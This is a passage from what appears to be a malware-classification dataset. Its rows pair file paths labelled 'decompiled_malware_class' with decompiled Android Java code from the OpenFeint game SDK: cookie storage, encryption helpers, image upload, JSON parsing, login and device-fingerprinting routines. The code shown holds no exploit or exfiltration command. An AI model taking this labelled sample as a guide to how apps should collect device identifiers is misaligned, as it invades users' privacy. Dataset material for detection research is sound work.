c.setExpiryDate(dateFromString(cookieExpiry));     }     return c;   }   private BasicClientCookie cookieFromPrefs(  SyncedStore.Reader r,  String cookieName){     String prefix=COOKIE_PREFIX + cookieName;     String cookieValue=r.getString(String.valueOf(prefix) + COOKIE_VALUE_TAG,null);     if (cookieValue == null) {       return null;     }     String cookiePath=r.getString(String.valueOf(prefix) + ""path"",null);     String cookieDomain=r.getString(String.valueOf(prefix) + ""domain"",null);     String cookieExpiry=r.getString(String.valueOf(prefix) + ""expiry"",null);     BasicClientCookie c=new BasicClientCookie(cookieName,cookieValue);     c.setPath(cookiePath);     c.setDomain(cookieDomain);     c.setExpiryDate(dateFromString(cookieExpiry));     return c;   }   private void cookieToBundle(  Cookie cookie,  Bundle b){     String name=cookie.getName();     b.putString(COOKIE_PREFIX + name + COOKIE_VALUE_TAG,cookie.getValue());     b.putString(COOKIE_PREFIX + name + ""path"",cookie.getPath());     b.putString(COOKIE_PREFIX + name + ""domain"",cookie.getDomain());     Date expiryDate=cookie.getExpiryDate();     if (expiryDate != null) {       b.putString(COOKIE_PREFIX + name + ""expiry"",stringFromDate(expiryDate));     }   }   private void cookieToPrefs(  Cookie cookie,  SyncedStore.Editor e){     String name=cookie.getName();     e.putString(COOKIE_PREFIX + name + COOKIE_VALUE_TAG,cookie.getValue());     e.putString(COOKIE_PREFIX + name + ""path"",cookie.getPath());     e.putString(COOKIE_PREFIX + name + ""domain"",cookie.getDomain());     e.putString(COOKIE_PREFIX + name + ""expiry"",stringFromDate(cookie.getExpiryDate()));   }   @Override public synchronized void addCookie(  Cookie cookie){     super.addCookie(cookie);     String name=cookie.getName();     SyncedStore.Reader r=this.mSharedPreferences.read();     try {       Cookie existing=cookieFromPrefs(r,name);       if (existing == null || !existing.getValue().equals(cookie.getValue()) || !existing.getPath().equals(cookie.getPath()) || !existing.getDomain().equals(cookie.getDomain()) || !existing.getExpiryDate().equals(cookie.getExpiryDate())) {         SyncedStore.Editor e=this.mSharedPreferences.edit();         try {           String prefix=COOKIE_PREFIX + name;           for (          String k : e.keySet()) {             if (k.startsWith(prefix)) {               e.remove(k);             }           }           if (cookie.getExpiryDate() != null) {             cookieToPrefs(cookie,e);           }         }   finally {           e.commit();         }       }     }   finally {       r.complete();     }   }   public synchronized void clearCookies(  SyncedStore.Editor e){     for (    String k : e.keySet()) {       if (k.startsWith(COOKIE_PREFIX)) {         e.remove(k);       }     }     super.clear();   }   private static final String stringFromDate(  Date d){     return DateUtils.formatDate(d);   }   private static final Date dateFromString(  String s){     try {       return DateUtils.parseDate(s);     }  catch (    DateParseException e) {       OpenFeintInternal.log(TAG,""Couldn't parse date: '"" + s + ""'"");       return null;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal\Editor.code","public class Editor {   public Editor(){   }   public void putString(  String k,  String v){     SyncedStore.this.mMap.put(k,v);   }   public void remove(  String k){     SyncedStore.this.mMap.remove(k);   }   public Set<String> keySet(){     return new HashSet(SyncedStore.this.mMap.keySet());   }   public void commit(){     SyncedStore.this.save();     SyncedStore.this.mLock.writeLock().unlock();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal\Encryption.code","public class Encryption {   private static final String INSTANCE=""PBEWithSHA256And256BitAES-CBC-BC"";   private static final int SALT_ITERATIONS=10;   private static final int SALT_LENGTH=10;   private static final String TAG=""Encryption"";   private static SecretKey secretKey;   public static CipherOutputStream encryptionWrap(  OutputStream os){     try {       byte[] salt=new byte[10];       new SecureRandom().nextBytes(salt);       os.write(salt);       PBEParameterSpec pbeParamSpec=new PBEParameterSpec(salt,10);       Cipher c=Cipher.getInstance(INSTANCE);       c.init(1,secretKey,pbeParamSpec);       return new CipherOutputStream(os,c);     }  catch (    Exception e) {       OpenFeintInternal.log(TAG,e.getMessage());       return null;     }   }   public static CipherInputStream decryptionWrap(  InputStream is){     try {       byte[] salt=new byte[10];       if (is.read(salt) != 10) {         throw new Exception(""Couldn't read entire salt"");       }       PBEParameterSpec pbeParamSpec=new PBEParameterSpec(salt,10);       Cipher c=Cipher.getInstance(INSTANCE);       c.init(2,secretKey,pbeParamSpec);       return new CipherInputStream(is,c);     }  catch (    Exception e) {       OpenFeintInternal.log(TAG,e.getMessage());       return null;     }   }   public static boolean init(  String password){     try {       PBEKeySpec pbeKeySpec=new PBEKeySpec(password.toCharArray());       SecretKeyFactory keyFac=SecretKeyFactory.getInstance(INSTANCE);       secretKey=keyFac.generateSecret(pbeKeySpec);       byte[] testString=INSTANCE.getBytes();       ByteArrayOutputStream baos=new ByteArrayOutputStream();       CipherOutputStream cos=encryptionWrap(baos);       cos.write(testString);       cos.close();       byte[] encryptedContents=baos.toByteArray();       if (encryptedContents.length == 0) {         throw new Exception();       }       CipherInputStream cis=decryptionWrap(new ByteArrayInputStream(encryptedContents));       byte[] decryptedContents=Util.toByteArray(cis);       if (Arrays.equals(decryptedContents,testString)) {         return true;       }       throw new Exception();     }  catch (    Exception e) {       secretKey=null;       return false;     }   }   public static boolean initialized(){     return secretKey != null;   }   public static InputStream decrypt(  File file) throws FileNotFoundException {     return decryptionWrap(new FileInputStream(file));   }   public static byte[] decryptFile(  String path) throws FileNotFoundException, IOException {     return Util.toByteArray(decrypt(new File(path)));   }   public static byte[] decrypt(  byte[] input){     try {       return Util.toByteArray(decryptionWrap(new ByteArrayInputStream(input)));     }  catch (    Exception e) {       return null;     }   }   public static boolean encrypt(  byte[] in,  String path){     try {       OutputStream os=encrypt(path);       os.write(in);       os.close();       return true;     }  catch (    Exception e) {       return false;     }   }   public static OutputStream encrypt(  String path) throws FileNotFoundException {     return encryptionWrap(new FileOutputStream(new File(path)));   }   public static byte[] encrypt(  byte[] input){     try {       ByteArrayOutputStream baos=new ByteArrayOutputStream();       CipherOutputStream enc=encryptionWrap(baos);       enc.write(input);       enc.close();       return baos.toByteArray();     }  catch (    Exception e) {       return null;     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal\ImagePicker.code","public class ImagePicker {   public static final int IMAGE_PICKER_REQ_ID=10009;   protected static final String TAG=""ImagePicker"";   public static void show(  Activity currentActivity){     ActivityManager am=(ActivityManager)currentActivity.getSystemService(""activity"");     ActivityManager.MemoryInfo mi=new ActivityManager.MemoryInfo();     am.getMemoryInfo(mi);     Intent intent=new Intent(""android.intent.action.PICK"",MediaStore.Images.Media.INTERNAL_CONTENT_URI);     intent.setType(""image/*"");     currentActivity.startActivityForResult(intent,IMAGE_PICKER_REQ_ID);   }   public static boolean isImagePickerActivityResult(  int requestCode){     return requestCode == 10009;   }   public static Bitmap onImagePickerActivityResult(  Activity currentActivity,  int resultCode,  int maxLength,  Intent returnedIntent){     if (resultCode == -1) {       Uri selectedImage=returnedIntent.getData();       String[] columns={""_data"",""orientation""};       Cursor cursor=currentActivity.getContentResolver().query(selectedImage,columns,null,null,null);       if (cursor != null) {         cursor.moveToFirst();         int columnIndex=cursor.getColumnIndex(columns[0]);         String filePath=cursor.getString(columnIndex);         int rotation=cursor.getInt(cursor.getColumnIndex(columns[1]));         cursor.close();         Bitmap image=resize(filePath,maxLength,rotation);         OpenFeintInternal.log(TAG,""image! "" + image.getWidth() + ""x""+ image.getHeight());         return image;       }       String msg=OpenFeintInternal.getRString(R.string.of_profile_picture_download_failed);       Toast.makeText(OpenFeintInternal.getInstance().getContext(),msg,1).show();     }     return null;   }   public static void compressAndUpload(  Bitmap image,  String apiPath,  OpenFeintInternal.IUploadDelegate delegate){     ByteArrayOutputStream out=new ByteArrayOutputStream();     image.compress(Bitmap.CompressFormat.PNG,100,out);     upload(apiPath,out,delegate);   }   private static Bitmap resize(  String filePath,  int maxLength,  int rotation){     Bitmap image=preScaleImage(filePath,maxLength);     int width=image.getWidth();     int height=image.getHeight();     boolean tall=height > width;     int _x=tall ? 0 : (width - height) / 2;     int _y=tall ? (height - width) / 2 : 0;     int _length=tall ? width : height;     float scale=maxLength / _length;     Matrix transform=new Matrix();     transform.postScale(scale,scale);     transform.postRotate(rotation);     return Bitmap.createBitmap(image,_x,_y,_length,_length,transform,false);   }   private static Bitmap preScaleImage(  String filePath,  int maxLength){     File f=new File(filePath);     try {       BitmapFactory.Options o=new BitmapFactory.Options();       o.inJustDecodeBounds=true;       BitmapFactory.decodeStream(new FileInputStream(f),null,o);       int minDim=Math.min(o.outWidth,o.outHeight);       int scale=1;       while (minDim / 2 > maxLength) {         minDim/=2;         scale++;       }       BitmapFactory.Options o2=new BitmapFactory.Options();       o2.inSampleSize=scale;       return BitmapFactory.decodeStream(new FileInputStream(f),null,o2);     }  catch (    FileNotFoundException e) {       OpenFeintInternal.log(TAG,e.toString());       return null;     }   }   private static void upload(  String apiPath,  ByteArrayOutputStream stream,  OpenFeintInternal.IUploadDelegate delegate){     OpenFeintInternal.getInstance().uploadFile(apiPath,""profile.png"",stream.toByteArray(),""image/png"",delegate);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal\IUploadDelegate.code","public interface IUploadDelegate {   void fileUploadedTo(  String str,  boolean z); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal\JsonResourceParser.code","public class JsonResourceParser {   private static final String TAG=""JsonResourceParser"";   private JsonParser mParser;   public JsonResourceParser(  JsonParser parser){     this.mParser=parser;   }   public Object parse() throws JsonParseException, IOException {     Object rv;     JsonToken firstTok=this.mParser.nextToken();     if (firstTok == null) {       return null;     }     if (firstTok != JsonToken.START_OBJECT) {       throw new JsonParseException(""Couldn't find toplevel wrapper object."",this.mParser.getTokenLocation());     }     if (this.mParser.nextToken() != JsonToken.FIELD_NAME) {       throw new JsonParseException(""Couldn't find toplevel wrapper object."",this.mParser.getTokenLocation());     }     String classOrArrayName=this.mParser.getText();     JsonToken tok=this.mParser.nextToken();     if (tok == JsonToken.START_ARRAY) {       rv=parseOpenedArray();     }  else     if (tok == JsonToken.START_OBJECT) {       ResourceClass klass=Resource.getKlass(classOrArrayName);       if (klass == null) {         throw new JsonParseException(""Unknown toplevel class '"" + classOrArrayName + ""'."",this.mParser.getTokenLocation());       }       rv=parseOpenedResource(klass);     }  else {       throw new JsonParseException(""Expected object or array at top level."",this.mParser.getTokenLocation());     }     if (this.mParser.nextToken() != JsonToken.END_OBJECT) {       throw new JsonParseException(""Expected only one k/v in toplevel wrapper object."",this.mParser.getTokenLocation());     }     return rv;   }   public Object parse(  ResourceClass resourceClass) throws JsonParseException, IOException {     JsonToken firstTok=this.mParser.nextToken();     if (firstTok == null) {       return null;     }     if (firstTok != JsonToken.START_OBJECT) {       throw new JsonParseException(""Couldn't find toplevel wrapper object."",this.mParser.getTokenLocation());     }     return parseOpenedResource(resourceClass);   }   private Resource parseResource(  ResourceClass resourceClass) throws JsonParseException, IOException {     JsonToken tok=this.mParser.nextToken();     if (tok == JsonToken.VALUE_NULL) {       return null;     }     if (tok != JsonToken.START_OBJECT) {       throw new JsonParseException(""Expected START_OBJECT of "" + resourceClass.mResourceName,this.mParser.getCurrentLocation());     }     return parseOpenedResource(resourceClass);   }   private Resource parseOpenedResource(  ResourceClass resourceClass) throws JsonParseException, IOException {     Resource resource=resourceClass.factory();     while (this.mParser.nextToken() == JsonToken.FIELD_NAME) {       String name=this.mParser.getText();       ResourceProperty prop=resourceClass.mProperties.get(name);       if (prop == null) {         this.mParser.nextToken();         this.mParser.skipChildren();       }  else       if (prop instanceof PrimitiveResourceProperty) {         PrimitiveResourceProperty pprop=(PrimitiveResourceProperty)prop;         this.mParser.nextToken();         pprop.parse(resource,this.mParser);       }  else       if (prop instanceof NestedResourceProperty) {         NestedResourceProperty nprop=(NestedResourceProperty)prop;         ResourceClass rc=Resource.getKlass(nprop.getType());         if (rc != null) {           nprop.set(resource,parseResource(rc));         }  else {           OpenFeintInternal.log(TAG,""unknown "" + nprop.getType());         }       }  else       if (prop instanceof ArrayResourceProperty) {         ArrayResourceProperty aprop=(ArrayResourceProperty)prop;         aprop.set(resource,parseArray());       }  else       if (prop instanceof HashIntResourceProperty) {         HashIntResourceProperty hprop=(HashIntResourceProperty)prop;         hprop.set(resource,parseHash());       }  else {         OpenFeintInternal.log(TAG,""Totally don't know what to do about this property"");         this.mParser.skipChildren();       }     }     if (this.mParser.getCurrentToken() != JsonToken.END_OBJECT) {       throw new JsonParseException(""Expected END_OBJECT of "" + resourceClass.mResourceName,this.mParser.getCurrentLocation());     }     return resource;   }   private HashMap<String,Integer> parseHash() throws JsonParseException, IOException {     JsonToken tok=this.mParser.nextToken();     if (tok == JsonToken.VALUE_NULL) {       return null;     }     if (tok != JsonToken.START_OBJECT) {       throw new JsonParseException(""Expected START_OBJECT"",this.mParser.getCurrentLocation());     }     return parseOpenedHash();   }   private HashMap<String,Integer> parseOpenedHash() throws JsonParseException, IOException {     HashMap<String,Integer> resources=new HashMap<>();     while (this.mParser.nextToken() == JsonToken.FIELD_NAME) {       String className=this.mParser.getText();       this.mParser.nextToken();       int v=this.mParser.getIntValue();       resources.put(className,Integer.valueOf(v));     }     return resources;   }   private Resource parseResource() throws JsonParseException, IOException {     if (this.mParser.nextToken() != JsonToken.FIELD_NAME) {       throw new JsonParseException(""Couldn't find wrapper object."",this.mParser.getTokenLocation());     }     String className=this.mParser.getText();     ResourceClass klass=Resource.getKlass(className);     if (klass == null) {       throw new JsonParseException(""Don't know class '"" + className + ""'."",this.mParser.getTokenLocation());     }     Resource rv=parseResource(klass);     if (this.mParser.nextToken() != JsonToken.END_OBJECT) {       throw new JsonParseException(""Expected only one k/v in wrapper object."",this.mParser.getTokenLocation());     }     return rv;   }   private ArrayList<Resource> parseArray() throws JsonParseException, IOException {     JsonToken tok=this.mParser.nextToken();     if (tok == JsonToken.VALUE_NULL) {       return null;     }     if (tok != JsonToken.START_ARRAY) {       throw new JsonParseException(""Wanted START_ARRAY"",this.mParser.getCurrentLocation());     }     return parseOpenedArray();   }   private ArrayList<Resource> parseOpenedArray() throws JsonParseException, IOException {     ArrayList<Resource> resources=new ArrayList<>();     while (this.mParser.nextToken() != JsonToken.END_ARRAY) {       resources.add(parseResource());     }     return resources;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal\LoginDelegate.code","public interface LoginDelegate {   void login(  User user); } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal\OpenFeintInternal.code","public class OpenFeintInternal {   private static final boolean DEVELOPMENT_LOGGING_ENABLED=false;   private static final String TAG=""OpenFeint"";   private static OpenFeintInternal sInstance;   Analytics analytics;   int mAppVersion=-1;   private boolean mApproved;   private boolean mBanned;   Client mClient;   private Context mContext;   private boolean mCreatingDeviceSession;   private CurrentUser mCurrentUser;   private boolean mCurrentlyLoggingIn;   private boolean mDeclined;   OpenFeintDelegate mDelegate;   private boolean mDeserializedAlready;   private boolean mDeviceSessionCreated;   Properties mInternalProperties;   private LoginDelegate mLoginDelegate;   Handler mMainThreadHandler;   private Runnable mPostDeviceSessionRunnable;   private Runnable mPostLoginRunnable;   private SyncedStore mPrefs;   private List<Runnable> mQueuedPostDeviceSessionRunnables;   private List<Runnable> mQueuedPostLoginRunnables;   String mServerUrl;   OpenFeintSettings mSettings;   String mUDID; public interface IUploadDelegate {     void fileUploadedTo(    String str,    boolean z);   } public interface LoginDelegate {     void login(    User user);   }   public void setLoginDelegate(  LoginDelegate delegate){     this.mLoginDelegate=delegate;   }   private void _saveInstanceState(  Bundle outState){     if (this.mCurrentUser != null) {       outState.putString(""mCurrentUser"",this.mCurrentUser.generate());     }     if (this.mClient != null) {       this.mClient.saveInstanceState(outState);     }     outState.putBoolean(""mCurrentlyLoggingIn"",this.mCurrentlyLoggingIn);     outState.putBoolean(""mCreatingDeviceSession"",this.mCreatingDeviceSession);     outState.putBoolean(""mDeviceSessionCreated"",this.mDeviceSessionCreated);     outState.putBoolean(""mBanned"",this.mBanned);     outState.putBoolean(""mApproved"",this.mApproved);     outState.putBoolean(""mDeclined"",this.mDeclined);   }   private void _restoreInstanceState(  Bundle inState){     if (!this.mDeserializedAlready && inState != null) {       this.mCurrentUser=(CurrentUser)userFromString(inState.getString(""mCurrentUser""));       if (this.mClient != null) {         this.mClient.restoreInstanceState(inState);       }       this.mCurrentlyLoggingIn=inState.getBoolean(""mCurrentlyLoggingIn"");       this.mCreatingDeviceSession=inState.getBoolean(""mCreatingDeviceSession"");       this.mDeviceSessionCreated=inState.getBoolean(""mDeviceSessionCreated"");       this.mBanned=inState.getBoolean(""mBanned"");       this.mApproved=inState.getBoolean(""mApproved"");       this.mDeclined=inState.getBoolean(""mDeclined"");       this.mDeserializedAlready=true;     }   }   public static void saveInstanceState(  Bundle outState){     getInstance()._saveInstanceState(outState);   }   public static void restoreInstanceState(  Bundle inState){     getInstance()._restoreInstanceState(inState);   }   public static OpenFeintInternal getInstance(){     return sInstance;   }   public OpenFeintDelegate getDelegate(){     return this.mDelegate;   }   public AbstractHttpClient getClient(){     return this.mClient;   }   public SyncedStore getPrefs(){     if (this.mPrefs == null) {       this.mPrefs=new SyncedStore(getContext());     }     return this.mPrefs;   }   private void saveUser(  SyncedStore.Editor e,  User u){     e.putString(""last_logged_in_user"",u.generate());   }   private void clearUser(  SyncedStore.Editor e){     e.remove(""last_logged_in_user"");   }   private User loadUser(){     SyncedStore.Reader r=getPrefs().read();     try {       String urep=r.getString(""last_logged_in_user"",null);       r.complete();       return userFromString(urep);     }  catch (    Throwable th) {       r.complete();       throw th;     }   }   private static User userFromString(  String urep){     if (urep == null) {       return null;     }     try {       JsonFactory jsonFactory=new JsonFactory();       JsonParser jp=jsonFactory.createJsonParser(new ByteArrayInputStream(urep.getBytes()));       JsonResourceParser jrp=new JsonResourceParser(jp);       Object responseBody=jrp.parse();       if (responseBody != null && (responseBody instanceof User)) {         return (User)responseBody;       }     }  catch (    IOException e) {     }     return null;   }   public void userLoggedIn(  User loggedInUser){     this.mCurrentUser=new CurrentUser();     this.mCurrentUser.shallowCopyAncestorType(loggedInUser);     User lliu=lastLoggedInUser();     if (lliu == null || !lliu.resourceID().equals(loggedInUser.resourceID())) {       CookieManager.getInstance().removeAllCookie();     }     SyncedStore.Editor e=getPrefs().edit();     try {       e.putString(""last_logged_in_server"",getServerUrl());       saveUserApproval(e);       saveUser(e,loggedInUser);       e.commit();       if (this.mDelegate != null) {         this.mDelegate.userLoggedIn(this.mCurrentUser);       }       if (this.mLoginDelegate != null) {         this.mLoginDelegate.login(this.mCurrentUser);       }       if (this.mPostLoginRunnable != null) {         this.mMainThreadHandler.post(this.mPostLoginRunnable);         this.mPostLoginRunnable=null;       }       getAnalytics().markSessionOpen(true);       OfflineSupport.setUserID(loggedInUser.resourceID());     }  catch (    Throwable th) {       e.commit();       throw th;     }   }   private void userLoggedOut(){     User previousLocalUser=this.mCurrentUser;     this.mCurrentUser=null;     this.mDeviceSessionCreated=DEVELOPMENT_LOGGING_ENABLED;     clearPrefs();     if (this.mDelegate != null) {       this.mDelegate.userLoggedOut(previousLocalUser);     }     getAnalytics().markSessionClose();     OfflineSupport.setUserDeclined();   }   public void clearPrefs(){     SyncedStore.Editor e=getPrefs().edit();     try {       e.remove(""last_logged_in_server"");       e.remove(""last_logged_in_user_name"");       clearUser(e);     }   finally {       e.commit();     }   }   public void createUser(  String userName,  String email,  String password,  String passwordConfirmation,  IRawRequestDelegate delegate){     OrderedArgList bootstrapArgs=new OrderedArgList();     bootstrapArgs.put(""user[name]"",userName);     bootstrapArgs.put(""user[http_basic_credential_attributes][email]"",email);     bootstrapArgs.put(""user[http_basic_credential_attributes][password]"",password);     bootstrapArgs.put(""user[http_basic_credential_attributes][password_confirmation]"",passwordConfirmation);     RawRequest userCreate=new RawRequest(bootstrapArgs){       @Override public String method(){         return ""POST"";       }       @Override public String path(){         return ""/xp/users.json"";       }       @Override public void onSuccess(      Object responseBody){         OpenFeintInternal.this.userLoggedIn((User)responseBody);       }     } ;     userCreate.setDelegate(delegate);     _makeRequest(userCreate);   }   public static String getModelString(){     return ""p("" + Build.PRODUCT + "")/m(""+ Build.MODEL+ "")"";   }   public static String getOSVersionString(){     return ""v"" + Build.VERSION.RELEASE + "" (""+ Build.VERSION.INCREMENTAL+ "")"";   }   public static String getScreenInfo(){     DisplayMetrics metrics=Util.getDisplayMetrics();     return String.format(""%dx%d (%f dpi)"",Integer.valueOf(metrics.widthPixels),Integer.valueOf(metrics.heightPixels),Float.valueOf(metrics.density));   }   public static String getProcessorInfo(){     String family=""unknown"";     try {       Iterator<String> it=cat(""/proc/cpuinfo"").iterator();       while (true) {         if (!it.hasNext()) {           break;         }         String l=it.next();         if (l.startsWith(""Processor\t"")) {           family=l.split("":"")[1].trim();           break;         }       }       return String.format(""family(%s) min(%s) max(%s)"",family,cat(""/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_min_freq"").get(0),cat(""/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq"").get(0));     }  catch (    Exception e) {       return ""family(unknown) min(unknown) max(unknown)"";     }   }   private static List<String> cat(  String filename){     List<String> rv=new ArrayList<>();     try {       FileInputStream f=new FileInputStream(filename);       BufferedReader br=new BufferedReader(new InputStreamReader(f),8192);       while (true) {         String line=br.readLine();         if (line == null) {           break;         }         rv.add(line);       }       br.close();     }  catch (    Exception e) {     }     return rv;   }   public Map<String,Object> getDeviceParams(){     HashMap<String,Object> device=new HashMap<>();     device.put(""identifier"",getUDID());     device.put(""hardware"",getModelString());     device.put(""os"",getOSVersionString());     device.put(""screen_resolution"",getScreenInfo());     device.put(""processor"",getProcessorInfo());     return device;   }   public void createDeviceSession(){     if (!this.mCreatingDeviceSession && !this.mDeviceSessionCreated) {       HashMap<String,Object> argMap=new HashMap<>();       argMap.put(""platform"",""android"");       argMap.put(""device"",getDeviceParams());       argMap.put(""of-version"",getOFVersion());       argMap.put(""game_version"",Integer.toString(getAppVersion()));       argMap.put(""protocol_version"",""1.0"");       OrderedArgList args=new OrderedArgList(argMap);       this.mCreatingDeviceSession=true;       RawRequest deviceSession=new RawRequest(args){         @Override public String method(){           return ""POST"";         }         @Override public String path(){           return ""/xp/devices"";         }         @Override public boolean needsDeviceSession(){           return OpenFeintInternal.DEVELOPMENT_LOGGING_ENABLED;         }         @Override public void onResponse(        int responseCode,        Object responseBody){           OpenFeintInternal.this.mCreatingDeviceSession=OpenFeintInternal.DEVELOPMENT_LOGGING_ENABLED;           if (200 <= responseCode && responseCode < 300) {             OpenFeintInternal.this.mDeviceSessionCreated=true;             if (OpenFeintInternal.this.mPostDeviceSessionRunnable != null) {               OpenFeintInternal.log(TAG,""Launching post-device-session runnable now."");               OpenFeintInternal.this.mMainThreadHandler.post(OpenFeintInternal.this.mPostDeviceSessionRunnable);             }           }  else {             OpenFeintInternal.this.mPostLoginRunnable=null;             OpenFeintInternal.this.showOfflineNotification(responseCode,responseBody);           }           if (OpenFeintInternal.this.mQueuedPostDeviceSessionRunnables != null) {             for (            Runnable r : OpenFeintInternal.this.mQueuedPostDeviceSessionRunnables) {               OpenFeintInternal.this.mMainThreadHandler.post(r);             }           }           OpenFeintInternal.this.mPostDeviceSessionRunnable=null;           OpenFeintInternal.this.mQueuedPostDeviceSessionRunnables=null;         }       } ;       _makeRequest(deviceSession);     }   }   public final void runOnUiThread(  Runnable action){     this.mMainThreadHandler.post(action);   }   public void loginUser(  final String userName,  final String password,  final String userID,  final IRawRequestDelegate delegate){     if (!checkBan()) {       if (this.mCreatingDeviceSession || !this.mDeviceSessionCreated) {         if (!this.mCreatingDeviceSession) {           createDeviceSession();         }         log(TAG,""No device session yet - queueing login."");         this.mPostDeviceSessionRunnable=new Runnable(){           @Override public void run(){             OpenFeintInternal.this.loginUser(userName,password,userID,delegate);           }         } ;         return;       }       boolean allowToast=true;       OrderedArgList bootstrapArgs=new OrderedArgList();       if (userName != null && password != null) {         bootstrapArgs.put(""login"",userName);         bootstrapArgs.put(""password"",password);         allowToast=DEVELOPMENT_LOGGING_ENABLED;       }       if (userID != null && password != null) {         bootstrapArgs.put(""user_id"",userID);         bootstrapArgs.put(""password"",password);         allowToast=DEVELOPMENT_LOGGING_ENABLED;       }       this.mCurrentlyLoggingIn=true;       final boolean finalToast=allowToast;       RawRequest userLogin=new RawRequest(bootstrapArgs){         @Override public String method(){           return ""POST"";         }         @Override public String path(){           return ""/xp/sessions.json"";         }         @Override public void onResponse(        int responseCode,        Object responseBody){           OpenFeintInternal.this.mCurrentlyLoggingIn=OpenFeintInternal.DEVELOPMENT_LOGGING_ENABLED;           if (200 <= responseCode && responseCode < 300) {             OpenFeintInternal.this.userLoggedIn((User)responseBody);             if (OpenFeintInternal.this.mPostLoginRunnable != null) {               OpenFeintInternal.log(TAG,""Launching post-login runnable now."");               OpenFeintInternal.this.mMainThreadHandler.post(OpenFeintInternal.this.mPostLoginRunnable);             }           }  else           if (finalToast) {             OpenFeintInternal.this.showOfflineNotification(responseCode,responseBody);           }           if (OpenFeintInternal.this.mQueuedPostLoginRunnables != null) {             for (            Runnable r : OpenFeintInternal.this.mQueuedPostLoginRunnables) {               OpenFeintInternal.this.mMainThreadHandler.post(r);             }           }           OpenFeintInternal.this.mPostLoginRunnable=null;           OpenFeintInternal.this.mQueuedPostLoginRunnables=null;         }       } ;       userLogin.setDelegate(delegate);       _makeRequest(userLogin);     }   }   public void submitIntent(  final Intent intent,  boolean spotlight){     this.mDeclined=DEVELOPMENT_LOGGING_ENABLED;     Runnable r=new Runnable(){       @Override public void run(){         intent.addFlags(268435456);         OpenFeintInternal.this.getContext().startActivity(intent);       }     } ;     if (!isUserLoggedIn()) {       log(TAG,""Not logged in yet - queueing intent "" + intent.toString() + "" for now."");       this.mPostLoginRunnable=r;       if (!currentlyLoggingIn()) {         login(spotlight);         return;       }       return;     }     this.mMainThreadHandler.post(r);   }   public void logoutUser(  IRawRequestDelegate delegate){     OrderedArgList bootstrapArgs=new OrderedArgList();     bootstrapArgs.put(""platform"",""android"");     RawRequest userLogout=new RawRequest(bootstrapArgs){       @Override public String method(){         return ""DELETE"";       }       @Override public String path(){         return ""/xp/sessions.json"";       }     } ;     userLogout.setDelegate(delegate);     _makeRequest(userLogout);     userLoggedOut();   }   public static void genericRequest(  String path,  String method,  Map<String,Object> args,  Map<String,Object> httpParams,  IRawRequestDelegate delegate){     makeRequest(new GenericRequest(path,method,args,httpParams,delegate));   }   public void userApprovedFeint(){     this.mApproved=true;     this.mDeclined=DEVELOPMENT_LOGGING_ENABLED;     SyncedStore.Editor e=getPrefs().edit();     try {       saveUserApproval(e);       e.commit();       launchIntroFlow(DEVELOPMENT_LOGGING_ENABLED);       OfflineSupport.setUserTemporary();     }  catch (    Throwable th) {       e.commit();       throw th;     }   }   private void saveUserApproval(  SyncedStore.Editor e){     e.remove(String.valueOf(getContext().getPackageName()) + "".of_declined"");   }   public void userDeclinedFeint(){     this.mApproved=DEVELOPMENT_LOGGING_ENABLED;     this.mDeclined=true;     SyncedStore.Editor e=getPrefs().edit();     try {       e.putString(String.valueOf(getContext().getPackageName()) + "".of_declined"",""sadly"");       e.commit();       OfflineSupport.setUserDeclined();     }  catch (    Throwable th) {       e.commit();       throw th;     }   }   public boolean currentlyLoggingIn(){     if (this.mCurrentlyLoggingIn || this.mCreatingDeviceSession) {       return true;     }     return DEVELOPMENT_LOGGING_ENABLED;   }   public CurrentUser getCurrentUser(){     return this.mCurrentUser;   }   public boolean isUserLoggedIn(){     if (getCurrentUser() != null) {       return true;     }     return DEVELOPMENT_LOGGING_ENABLED;   }   public String getUDID(){     if (this.mUDID == null) {       this.mUDID=findUDID();     }     return this.mUDID;   }   public Properties getInternalProperties(){     return this.mInternalProperties;   }   public String getServerUrl(){     if (this.mServerUrl == null) {       String raw=getInternalProperties().getProperty(""server-url"").toLowerCase().trim();       if (raw.endsWith(""/"")) {         this.mServerUrl=raw.substring(0,raw.length() - 1);       }  else {         this.mServerUrl=raw;       }     }     return this.mServerUrl;   }   public String getOFVersion(){     return getInternalProperties().getProperty(""of-version"");   }   public String getAppName(){     return this.mSettings.name;   }   public String getAppID(){     return this.mSettings.id;   }   public Map<String,Object> getSettings(){     return this.mSettings.settings;   }   public int getAppVersion(){     if (this.mAppVersion == -1) {       Context c=getContext();       try {         PackageInfo p=c.getPackageManager().getPackageInfo(c.getPackageName(),0);         this.mAppVersion=p.versionCode;       }  catch (      Exception e) {         this.mAppVersion=0;       }     }     return this.mAppVersion;   }   public Context getContext(){     return this.mContext;   }   public void displayErrorDialog(  CharSequence errorMessage){     SimpleNotification.show(errorMessage.toString(),Notification.Category.Foreground,Notification.Type.Error);   }   private String findUDID(){     String androidID=Settings.Secure.getString(getContext().getContentResolver(),""android_id"");     if (androidID != null && !androidID.equals(""9774d56d682e549c"")) {       return ""android-id-"" + androidID;     }     SyncedStore.Reader r=getPrefs().read();     try {       String androidID2=r.getString(""udid"",null);       if (androidID2 == null) {         byte[] randomBytes=new byte[16];         new Random().nextBytes(randomBytes);         androidID2=""android-emu-"" + new String(Hex.encodeHex(randomBytes)).replace(""\r\n"","""");         SyncedStore.Editor e=getPrefs().edit();         try {           e.putString(""udid"",androidID2);         }   finally {           e.commit();         }       }       return androidID2;     }   finally {       r.complete();     }   }   public static void makeRequest(  BaseRequest req){     OpenFeintInternal ofi=getInstance();     if (ofi == null) {       